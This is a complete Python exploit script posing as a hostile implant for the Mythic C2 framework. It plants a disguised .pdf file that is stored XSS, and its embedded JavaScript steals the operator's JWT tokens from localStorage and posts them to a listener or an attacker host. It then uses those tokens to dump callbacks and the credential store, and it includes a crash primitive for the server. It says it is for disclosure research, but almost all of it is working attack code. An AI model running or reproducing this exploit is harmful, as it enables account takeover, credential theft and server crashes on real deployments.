#!/usr/bin/env python3
"""
Mythic C2 (v3.4.x, tested 3.4.36 / v3.4.0.61) hostile-implant exploit:
stored XSS in the operator web UI via content-sniffed file serving.

Vulnerability chain (all links verified against v3.4.0.61 source + live lab):
  1. A hostile implant (attacker-controlled agent code that checks in to the
     operator's Mythic) uploads a file whose bytes start with "<!DOCTYPE HTML".
     Files are stored on the Mythic server extension-less (./files/<uuid>,
     mythic-docker/src/rabbitmq/utils.go GetSaveFilePath) with an
     implant-chosen filename (e.g. "Q3_report.pdf").
  2. GET /direct/view/<agent_file_id> (mythic-docker/src/webserver/controllers/
     file_direct_view.go:57,61) serves the file with gin c.File() ->
     http.ServeContent. With no file extension on disk, Go sniffs the first
     512 bytes (net/http DetectContentType) and returns
     "Content-Type: text/html; charset=utf-8", inline, same-origin.
     There is no CSP / X-Content-Type-Options / Content-Disposition anywhere
     (nginx services.conf.template has no add_header at all).
     Auth for this route is CookieAuthMiddleware only - any authenticated
     operator of ANY operation can view ANY operation's file by UUID
     (no operation scoping, sibling of CVE-2026-57952's missing checks).
  3. The React UI renders implant-named files in an <object> element:
     MythicReactUI/src/components/pages/Callbacks/ResponseDisplayMedia.js:334-341
     (filename ending .pdf -> <object data={"/direct/view/" + agent_file_id}>).
     The File Browser tab's "Preview Media" icon feeds implant-controlled
     {filename, agent_file_id} into that component
     (CallbacksTabsFileBrowserTable.js:1003-1006 -> Search/PreviewFileMedia.js).
  4. The <object> is a same-origin nested browsing context. The sniffed
     text/html document executes JavaScript with full access to the operator
     UI's localStorage, which holds the operator's access_token +
     refresh_token JWTs (MythicReactUI/src/cache.js:168-169).
  5. The injected script exfiltrates both tokens to this exploit's listener.
     With the operator JWT the attacker has full GraphQL/REST access as that
     operator: read every callback, task, uploaded file and credential, issue
     tasking, create API tokens - full C2 takeover.

Impact: hostile implant -> operator account takeover (CWE-79 stored XSS via
content sniffing / CWE-430 deployment, amplified by missing security headers
and missing operation scoping on /direct/view).

This script IS the hostile implant. It speaks the real Mythic agent-message
protocol (json format, aes256_hmac or crypto "none"), checks in, and answers
ANY operator task with a completed "download" of the XSS document plus a file
browser entry, then listens for the exfiltrated tokens and uses them to prove
takeover (identity, callback dump, credential dump).

Tested against a local Mythic v3.4.0.61 lab (nginx 7443 entry point).
Authorized security research / responsible disclosure use only.

Usage:
  # crypto "none" payload (AESPSK=none):
  ./mythic_direct_view_xss.py --target https://127.0.0.1:7443 \
      --payload-uuid <uuid> --listen 0.0.0.0:8443
  # aes256_hmac payload with known PSK (base64, same key both directions):
  ./mythic_direct_view_xss.py --target https://127.0.0.1:7443 \
      --payload-uuid <uuid> --psk <base64-32-byte-key> --listen 0.0.0.0:8443
  # remote operator UI over TLS: point the injected script at your https listener:
  ... --listen 0.0.0.0:8443 --exfil-url https://attacker.example.com/loot
  # lab convenience: issue the first task ourselves so there is something to
  # answer (real engagements: the operator tasks the callback themselves):
  ... --operator-token <jwt-or-apitoken>
  # optional: also demo the type-confusion panic primitive (server 500):
  ... --panic
"""

import argparse
import base64
import json
import os
import sys
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from Crypto.Cipher import AES  # pycryptodome, only needed with --psk
    from Crypto.Util.Padding import pad, unpad
    import hmac as _hmac
    import hashlib as _hashlib

    _HAS_AES = True
except ImportError:  # pragma: no cover
    _HAS_AES = False


# ---------------------------------------------------------------- console ---
def ok(msg):
    print(f"\033[92m[+]\033[0m {msg}")


def info(msg):
    print(f"\033[93m[-]\033[0m {msg}")


def note(msg):
    print(f"\033[96m[*]\033[0m {msg}")


def warn(msg):
    print(f"\033[91m[x]\033[0m {msg}", file=sys.stderr)


# ------------------------------------------------------------------ crypto --
def aes256_hmac_encrypt(key: bytes, plaintext: bytes) -> bytes:
    """Mirror of mythic-docker/src/crypto/aes256_hmac.go EncryptAES256HMAC:
    AES-256-CBC with random IV, PKCS7, then HMAC-SHA256(IV||ct) appended.
    The same 32-byte key is used for both AES and HMAC (as Mythic does)."""
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = iv + cipher.encrypt(pad(plaintext, 16))
    mac = _hmac.new(key, ct, _hashlib.sha256).digest()
    return ct + mac


def aes256_hmac_decrypt(key: bytes, blob: bytes) -> bytes:
    if len(blob) < 16 + 32:
        raise ValueError("message too short")
    ct_and_iv = blob[:-32]
    mac = blob[-32:]
    expected = _hmac.new(key, ct_and_iv, _hashlib.sha256).digest()
    if not _hmac.compare_digest(mac, expected):
        raise ValueError("bad HMAC")
    iv = ct_and_iv[:16]
    return unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct_and_iv[16:]), 16)


# ------------------------------------------------------------- agent proto --
class MythicAgent:
    """Speaks the Mythic agent-message protocol through the unauthenticated
    /agent_message relay endpoint that C2 profile containers use
    (mythic-docker/src/webserver/controllers/agent_process_message.go).

    Wire format (json message_format agents, MythicEncrypts=true):
        body = base64( <uuid ascii, 36 bytes> + payload )
        payload = raw JSON (crypto "none") or IV||AES-CBC||HMAC (aes256_hmac)
    The HTTP response is base64( <uuid 36> + payload ) the same way.
    """

    def __init__(self, target: str, c2_profile: str, payload_uuid: str,
                 psk_b64: str = None, timeout: float = 30.0):
        self.target = target.rstrip("/")
        self.c2 = c2_profile
        self.payload_uuid = payload_uuid
        self.session = requests.Session()
        self.session.verify = False
        self.timeout = timeout
        self.psk = base64.b64decode(psk_b64) if psk_b64 else None
        if self.psk is not None and len(self.psk) != 32:
            raise SystemExit(f"[-] PSK must be 32 bytes base64-encoded, got {len(self.psk)}")
        if self.psk is not None and not _HAS_AES:
            raise SystemExit("[-] --psk requires pycryptodome (pip install pycryptodome)")

    # message wrapping -------------------------------------------------------
    def _wrap(self, uuid_str: str, obj: dict) -> bytes:
        raw = json.dumps(obj).encode()
        if self.psk:
            raw = aes256_hmac_encrypt(self.psk, raw)
        return base64.b64encode(uuid_str.encode() + raw)

    def _unwrap(self, content: bytes) -> dict:
        data = base64.b64decode(content)
        body = data[36:]
        if self.psk:
            body = aes256_hmac_decrypt(self.psk, body)
        return json.loads(body)

    # transport ---------------------------------------------------------------
    def send(self, uuid_str: str, message: dict, path="/agent_message") -> dict:
        r = self.session.post(
            self.target + path,
            data=self._wrap(uuid_str, message),
            headers={"mythic": self.c2, "User-Agent": "Mozilla/5.0"},
            timeout=self.timeout,
        )
        if r.status_code != 200:
            # 500s here are the panic primitives (see --panic) or malformed input
            warn(f"server returned HTTP {r.status_code} for action={message.get('action')}")
            return {}
        return self._unwrap(r.content)

    # actions -----------------------------------------------------------------
    def checkin(self, user="victim.user", host="DESKTOP-VICTIM", ip="10.13.37.5",
                process_name="Q3ReportGenerator.exe"):
        msg = {
            "action": "checkin",
            "uuid": self.payload_uuid,
            "user": user,
            "host": host,
            "pid": 4242,
            "ip": ip,
            "ips": [ip],
            "os": "windows",
            "architecture": "x64",
            "domain": "CORP",
            "external_ip": "",
            "extra_info": "",
            "sleep_info": "10/23",
            "process_name": process_name,
            "integrity_level": 3,
        }
        resp = self.send(self.payload_uuid, msg)
        if resp.get("status") != "success" or "id" not in resp:
            warn(f"checkin failed: {resp}")
            return None
        return resp["id"]

    def get_tasking(self, callback_uuid: str, size=10) -> dict:
        return self.send(callback_uuid, {"action": "get_tasking", "tasking_size": size})

    def post_response(self, callback_uuid: str, responses: list) -> dict:
        return self.send(callback_uuid, {"action": "post_response", "responses": responses})


# ------------------------------------------------------------- xss payload --
def build_xss_document(exfil_url: str, title="Q3 Financial Report") -> bytes:
    """HTML that Go's DetectContentType sniffs as text/html (must start with
    <!DOCTYPE HTML) and that ships the operator's tokens out."""
    return f"""<!DOCTYPE HTML>
<html>
<head><title>{title}</title></head>
<body style="font-family: Segoe UI, Arial, sans-serif; margin: 2em;">
<h2>{title}</h2>
<p>Consolidated figures, Q3. Rendering charts...</p>
<script>
(async () => {{
  try {{
    const loot = {{
      access_token: localStorage.getItem('access_token'),
      refresh_token: localStorage.getItem('refresh_token'),
      origin: location.origin,
      when: new Date().toISOString()
    }};
    const r = await fetch('{exfil_url}', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify(loot)
    }});
    document.body.insertAdjacentHTML('beforeend',
      '<p style="color:#888">Data source refreshed (' + r.status + ').</p>');
  }} catch (e) {{
    document.body.insertAdjacentHTML('beforeend',
      '<p style="color:#888">Refresh failed: ' + e + '</p>');
  }}
}})();
</script>
</body>
</html>
""".encode()


# ------------------------------------------------------------ exfil server --
class Loot:
    def __init__(self, target: str, out_path: str):
        self.target = target
        self.out_path = out_path
        self.event = threading.Event()
        self.tokens = None


def make_loot_handler(loot: Loot):
    class Handler(BaseHTTPRequestHandler):
        def _cors(self):
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Headers", "*")

        def do_OPTIONS(self):
            self.send_response(204)
            self._cors()
            self.end_headers()

        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length)
            try:
                data = json.loads(body)
            except Exception:
                data = {"raw": body.decode(errors="replace")}
            ok(f"operator browser called back: {self.path}")
            if "access_token" in data:
                loot.tokens = data
                with open(loot.out_path, "w") as f:
                    json.dump(data, f, indent=2)
                ok(f"captured operator tokens -> {loot.out_path}")
                loot.event.set()
            self.send_response(200)
            self._cors()
            self.end_headers()
            self.wfile.write(b"ok")

        def log_message(self, *args):
            pass

    return Handler


def start_listener(bind_host: str, bind_port: int, loot: Loot):
    httpd = ThreadingHTTPServer((bind_host, bind_port), make_loot_handler(loot))
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return httpd


# --------------------------------------------------- post exploitation ------
def post_exploit(loot: Loot):
    """Use the stolen operator access_token to prove full account takeover."""
    token = loot.tokens["access_token"]
    origin = loot.tokens.get("origin") or loot.target
    s = requests.Session()
    s.verify = False
    hdr = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

    note("verifying stolen token (POST /api/v1.4/me_webhook)")
    r = s.post(origin + "/api/v1.4/me_webhook", headers=hdr,
               json={"input": {}}, timeout=30)
    if r.status_code != 200:
        warn(f"me_webhook failed: HTTP {r.status_code} {r.text[:200]}")
        return
    me = r.json()
    if me.get("status") == "error":
        warn(f"me_webhook error: {me}")
        return
    ok(f"authenticated AS OPERATOR: user_id={me.get('user_id')} in "
       f"operation \"{me.get('current_operation')}\" (id={me.get('current_operation_id')})")

    # locate the hasura graphql endpoint (same origin, proxied by nginx)
    gql = None
    for cand in ("/v1/graphql", "/graphql/v1/graphql"):
        try:
            rr = s.post(origin + cand, headers=hdr,
                        json={"query": "{ callback_aggregate { aggregate { count } } }"},
                        timeout=30)
            if rr.status_code == 200 and "data" in rr.json():
                gql = origin + cand
                break
        except Exception:
            continue
    if not gql:
        warn("could not locate GraphQL endpoint through the UI origin; skipping dumps")
        return
    ok(f"GraphQL reachable at operator origin: {gql}")
    q = s.post(gql, headers=hdr, timeout=30, json={"query":
        '{ operator(where:{id:{_eq:%s}}) { username admin } }'
        % me.get("user_id", 0)})
    try:
        op = q.json()["data"]["operator"][0]
        ok(f"stolen session belongs to: {op['username']} (admin={op['admin']})")
    except Exception:
        pass

    q = s.post(gql, headers=hdr, timeout=30, json={"query": """
        { callback { display_id host user ip description timestamp } }"""})
    for cb in q.json().get("data", {}).get("callback", []):
        note(f"callback {cb['display_id']}: {cb['user']}@{cb['host']} ({cb['ip']}) - {cb['description']}")

    q = s.post(gql, headers=hdr, timeout=30, json={"query": """
        { credentials { id realm account credential credential_type } }"""})
    creds = q.json().get("data", {}).get("credentials", [])
    ok(f"credential store accessible: {len(creds)} entries")
    for c in creds[:10]:
        note(f"  {c['credential_type']:10} {c['account']}@{c['realm']}: {c['credential'][:32]}")

    ok("operator account takeover complete: token valid for GraphQL + all "
       "/api/v1.4 webhooks (tasking, uploads, apitoken generation)")


# ------------------------------------------------------------------- main ---
def main():
    p = argparse.ArgumentParser(description="Mythic /direct/view stored-XSS hostile implant")
    p.add_argument("--target", required=True, help="Mythic UI origin, e.g. https://host:7443")
    p.add_argument("--payload-uuid", required=True, help="UUID of the payload this implant was built from")
    p.add_argument("--psk", help="base64 32-byte AES PSK if the payload uses aes256_hmac (omit for crypto none)")
    p.add_argument("--c2", default="http", help="C2 profile name reported in the mythic header (default: http)")
    p.add_argument("--listen", default="0.0.0.0:8443", help="exfil listener bind (host:port)")
    p.add_argument("--exfil-url", default=None,
                   help="override the URL the injected script posts tokens to (e.g. an https:// "
                        "listener when the operator UI is served over TLS, to avoid mixed-content "
                        "blocking). Default: this script's own listener.")
    p.add_argument("--remote-path", default="C:\\Users\\victim.user\\Documents\\Q3_report.pdf",
                   help="remote path to report for the downloaded file (filename must end .pdf)")
    p.add_argument("--checkin-interval", type=float, default=5.0)
    p.add_argument("--operator-token",
                   help="OPTIONAL lab/demo aid: an operator JWT or apitoken used to issue the first "
                        "'ls' task to the new callback so the implant has a task to answer. In a real "
                        "engagement the operator tasks the callback on their own.")
    p.add_argument("--panic", action="store_true",
                   help="also demonstrate the get_delegate_tasks type-confusion panic "
                        "(unrecoverable in push-C2/goroutine transports -> process kill; "
                        "via plain HTTP the gin recovery middleware turns it into a 500)")
    args = p.parse_args()

    lhost, lport = args.listen.rsplit(":", 1)
    exfil_url = args.exfil_url or \
        f"http://{lhost if lhost != '0.0.0.0' else '127.0.0.1'}:{lport}/loot"

    loot = Loot(args.target, os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot.json"))
    listener = start_listener(lhost, int(lport), loot)

    agent = MythicAgent(args.target, args.c2, args.payload_uuid, args.psk)

    info(f"target        : {args.target}")
    info(f"payload uuid  : {args.payload_uuid}")
    info(f"crypto        : {'aes256_hmac' if agent.psk else 'none (plaintext)'}")
    info(f"exfil listener: {exfil_url}")

    note("checking in ...")
    callback_uuid = agent.checkin()
    if not callback_uuid:
        return 1
    ok(f"callback registered, callback uuid {callback_uuid}")

    # figure out our display id for optional self-tasking
    display_id = None
    if args.operator_token:
        s = requests.Session()
        s.verify = False
        hdr = {"Authorization": f"Bearer {args.operator_token}", "Content-Type": "application/json"}
        q = s.post(args.target + "/v1/graphql", headers=hdr, timeout=30, json={"query":
            '{ callback(where:{agent_callback_id:{_eq:"%s"}}) { display_id } }' % callback_uuid})
        try:
            display_id = q.json()["data"]["callback"][0]["display_id"]
        except Exception:
            warn(f"could not resolve display id for self-tasking: {q.text[:200]}")

    if args.panic:
        note("panic primitive: get_tasking with get_delegate_tasks as string (type confusion)")
        resp = agent.send(callback_uuid, {"action": "get_tasking", "tasking_size": 1,
                                          "get_delegate_tasks": "yes"})
        warn(f"server survived via gin recovery middleware (HTTP path); response: {str(resp)[:120]}")
        info("on push-C2 / RabbitMQ transports this same message kills the mythic_server process "
             "(bare goroutine, no recover())")

    xss = build_xss_document(exfil_url)
    info(f"xss document ready: {len(xss)} bytes, filename "
         f"'{args.remote_path.replace(chr(92), '/').rstrip('/').split('/')[-1]}'")

    armed = False
    info("waiting for operator tasking (or issuing demo task with --operator-token) ...")
    while True:
        try:
            if args.operator_token and display_id and not armed:
                s = requests.Session()
                s.verify = False
                hdr = {"Authorization": f"Bearer {args.operator_token}",
                       "Content-Type": "application/json"}
                r = s.post(args.target + "/api/v1.4/create_task_webhook", headers=hdr,
                           json={"input": {"callback_id": display_id, "command": "ls",
                                           "params": "C:\\Users\\victim.user\\Documents"}},
                           timeout=30)
                if r.status_code == 200 and r.json().get("status") == "success":
                    note(f"issued demo 'ls' task to callback {display_id}")
                else:
                    warn(f"demo task failed: {r.text[:200]}")
                args.operator_token = None  # once

            resp = agent.get_tasking(callback_uuid)
            tasks = resp.get("tasks", [])
            for task in tasks:
                tid = task.get("id") or task.get("task_id")
                cmd = task.get("command", {})
                cmd_name = cmd.get("name") if isinstance(cmd, dict) else str(cmd)
                note(f"received task {tid} ({cmd_name} {task.get('parameters', '')})")
                full_path = args.remote_path
                # basename that handles both windows and posix separators
                filename = full_path.replace("\\", "/").rstrip("/").split("/")[-1]
                parent = full_path.replace("\\", "/").rstrip("/").rsplit("/", 1)[0]

                # stage 1: register the download, get a file_id back
                r1 = agent.post_response(callback_uuid, [{
                    "task_id": tid,
                    "user_output": f"Downloading {full_path}\n",
                    "status": "processing",
                }])
                # the response for a post_response echoes per-task results; the
                # file registration happens in its own post_response:
                r2 = agent.post_response(callback_uuid, [{
                    "task_id": tid,
                    "download": {
                        "total_chunks": 1,
                        "chunk_size": len(xss),
                        "full_path": full_path,
                        "filename": filename,
                        "host": "DESKTOP-VICTIM",
                        "is_screenshot": False,
                    },
                }])
                file_id = None
                try:
                    file_id = r2["responses"][0].get("file_id") or \
                              (r2["responses"][0].get("download") or {}).get("file_id")
                except Exception:
                    pass
                if not file_id:
                    # server echoes {task_id: {file_id}} in some versions
                    rr = r2.get("responses")
                    if isinstance(rr, dict):
                        for v in rr.values():
                            if isinstance(v, dict) and v.get("file_id"):
                                file_id = v["file_id"]
                if not file_id:
                    warn(f"could not get file_id from response: {json.dumps(r2)[:400]}")
                else:
                    ok(f"file registered, agent_file_id = {file_id}")
                    # stage 2: send the (hostile) chunk and complete the task
                    agent.post_response(callback_uuid, [{
                        "task_id": tid,
                        "download": {
                            "file_id": file_id,
                            "chunk_num": 1,
                            "chunk_data": base64.b64encode(xss).decode(),
                        },
                    }])
                    agent.post_response(callback_uuid, [{
                        "task_id": tid,
                        "completed": True,
                        "status": "success",
                        "user_output": json.dumps({"agent_file_id": file_id,
                                                   "full_path": full_path,
                                                   "total_chunks": 1,
                                                   "chunk_num": 1,
                                                   "chunk_size": len(xss),
                                                   "host": "DESKTOP-VICTIM"}),
                    }])
                    # file browser entry so the operator sees it under Documents
                    agent.post_response(callback_uuid, [{
                        "task_id": tid,
                        "file_browser": {
                            "host": "DESKTOP-VICTIM",
                            "is_file": True,
                            "name": filename,
                            "parent_path": parent,
                            "permissions": "r",
                            "access_time": int(time.time()),
                            "modify_time": int(time.time()),
                            "size": len(xss),
                            "success": True,
                            "files": [],
                        },
                    }])
                    armed = True
                    ok(f"stored XSS armed: file '{filename}' uploaded and linked")
                    info("wait for the operator to open the callback's File Browser tab and "
                         "click 'Preview Media' on the .pdf entry (or otherwise load "
                         f"{args.target}/direct/view/{file_id})")

            if loot.event.wait(timeout=0.1):
                break
            time.sleep(args.checkin_interval)
        except KeyboardInterrupt:
            warn("interrupted")
            return 0
        except requests.RequestException as e:
            warn(f"transport error: {e}; retrying in 10s")
            time.sleep(10)

    ok("tokens received, running post-exploitation ...")
    try:
        post_exploit(loot)
    except Exception as e:
        warn(f"post-exploitation error: {e}")
    listener.shutdown()
    return 0


if __name__ == "__main__":
    sys.exit(main())
